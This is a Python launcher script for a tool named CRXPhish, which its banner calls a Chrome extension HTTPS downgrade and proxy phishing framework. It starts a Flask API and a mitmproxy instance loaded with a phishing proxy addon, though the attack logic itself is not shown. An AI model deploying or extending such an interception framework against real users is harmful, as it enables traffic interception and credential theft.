"""
Main entry-point: starts Flask (internal routes) and mitmproxy (proxy)
in parallel so a single command brings up the full backend.

Usage:
    python run.py                  # defaults from config.json
    python run.py --proxy-port 8080 --api-port 9000
"""

import argparse
import subprocess
import sys
import os
import time
import signal

from utils import get_config

BANNER = r"""
  ██████╗██████╗ ██╗  ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
 ██╔════╝██╔══██╗╚██╗██╔╝██╔══██╗██║  ██║██║██╔════╝██║  ██║
 ██║     ██████╔╝ ╚███╔╝ ██████╔╝███████║██║███████╗███████║
 ██║     ██╔══██╗ ██╔██╗ ██╔═══╝ ██╔══██║██║╚════██║██╔══██║
 ╚██████╗██║  ██║██╔╝ ██╗██║     ██║  ██║██║███████║██║  ██║
  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
 ──────────────────────────────────────────────────────────────
  Chrome Extension HTTPS Downgrade & Proxy Phishing Framework
  For authorized security research only.
 ──────────────────────────────────────────────────────────────
"""


def start_flask(api_port: int):
    """Launch the Flask API server in a subprocess."""
    env = os.environ.copy()
    return subprocess.Popen(
        [sys.executable, "api.py"],
        env={**env, "FLASK_RUN_PORT": str(api_port)},
        cwd=os.path.dirname(os.path.abspath(__file__)),
    )


def start_mitmproxy(proxy_port: int):
    """Launch mitmdump with the phishing proxy addon."""
    return subprocess.Popen(
        [
            "mitmdump",
            "--mode", "regular",
            "-p", str(proxy_port),
            "-s", os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxy.py"),
            "--set", "stream_large_bodies=1",
        ],
        cwd=os.path.dirname(os.path.abspath(__file__)),
    )


def main():
    print(BANNER)

    config = get_config()

    parser = argparse.ArgumentParser(description="CRXPhish — Chrome extension phishing research backend")
    parser.add_argument(
        "--proxy-port", type=int,
        default=int(config.get("proxy_port", 8080)),
        help="Port for the mitmproxy listener (default: 8080)",
    )
    parser.add_argument(
        "--api-port", type=int,
        default=int(config.get("api_port", 9000)),
        help="Port for the internal Flask API (default: 9000)",
    )
    args = parser.parse_args()

    print(f"  [*] Starting Flask API on port {args.api_port}")
    flask_proc = start_flask(args.api_port)
    time.sleep(1)  # give Flask a moment to bind

    print(f"  [*] Starting mitmproxy on port {args.proxy_port}")
    mitm_proc = start_mitmproxy(args.proxy_port)

    print(f"  [*] All services running. Press Ctrl+C to stop.\n")

    def shutdown(sig, frame):
        print("\n[*] Shutting down...")
        mitm_proc.terminate()
        flask_proc.terminate()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)

    try:
        mitm_proc.wait()
    except KeyboardInterrupt:
        shutdown(None, None)


if __name__ == "__main__":
    main()
